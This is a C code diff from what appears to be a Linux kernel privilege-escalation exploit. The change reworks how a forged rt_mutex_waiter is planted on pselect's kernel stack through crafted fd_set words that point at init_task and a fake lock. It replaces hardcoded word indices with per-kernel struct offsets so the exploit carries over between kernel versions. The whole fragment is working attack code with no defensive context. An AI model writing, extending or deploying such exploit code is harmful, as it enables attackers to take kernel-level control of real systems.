@@ -75,14 +75,40 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
   FD_ZERO(out);
   FD_ZERO(ex);
 
-  fdset_put_word(in, 0, fake_w0);
-  fdset_put_word(in, 1, 0);
-  fdset_put_word(in, 2, 0);
-  fdset_put_word(in, 3, 0);
-  fdset_put_word(ex, 0, text_addr(INIT_TASK));
-  fdset_put_word(ex, 1, fake_lock);
-  fdset_put_word(ex, 2, 3);
-  fdset_put_word(ex, 3, 0);
+  // Same forged-waiter-over-pselect's-stack trick as slide.c, so it has the
+  // same two dependencies on the target kernel and must not hardcode word
+  // indices either: rt_mutex_waiter's field offsets differ between kernel
+  // lines, and where the fd_set block lands relative to the real waiter is a
+  // property of the compiled stack frames (SLIDE_PSELECT_WORD_SHIFT).
+  //
+  // The previous literals — in[0], then ex[0..3] — encoded exactly the 6.6
+  // layout at shift 0: tree_entry at word 0, then task/lock/wake_state/ww_ctx
+  // at words 10/11/12/13, i.e. offsets 0x50/0x58/0x60/0x68. Build the waiter
+  // as bytes from the target's own offsets instead and let the placement fall
+  // out of that.
+  unsigned char waiter[FAKE_WAITER_SIZE];
+  memset(waiter, 0, sizeof(waiter));
+  put64(waiter, FAKE_WAITER_TREE_ENTRY_OFF, fake_w0);
+  put64(waiter, FAKE_WAITER_TASK_OFF, text_addr(INIT_TASK));
+  put64(waiter, FAKE_WAITER_LOCK_OFF, fake_lock);
+  put32(waiter, FAKE_WAITER_WAKE_STATE_OFF, 3);
+  put64(waiter, FAKE_WAITER_WW_CTX_OFF, 0);
+
+  int words_per_set = slide_pselect_words_per_set();
+  for (size_t word = 0; word < sizeof(waiter) / sizeof(uint64_t); word++) {
+    uint64_t value;
+    memcpy(&value, waiter + word * sizeof(uint64_t), sizeof(value));
+    if (!value) {
+      continue;  // FD_ZERO already cleared it
+    }
+    int global_word = slide_pselect_global_word((int)word);
+    if (!slide_pselect_put_global_word(
+            in, out, ex, words_per_set, global_word, value)) {
+      pr_warning("pselect route cannot place waiter_word=%zu global_word=%d "
+                 "words_per_set=%d nfds=%d\n",
+                 word, global_word, words_per_set, PSELECT_ROUTE_NFDS);
+    }
+  }
 }
 
 void do_pselect_fake_lock_route(void) {
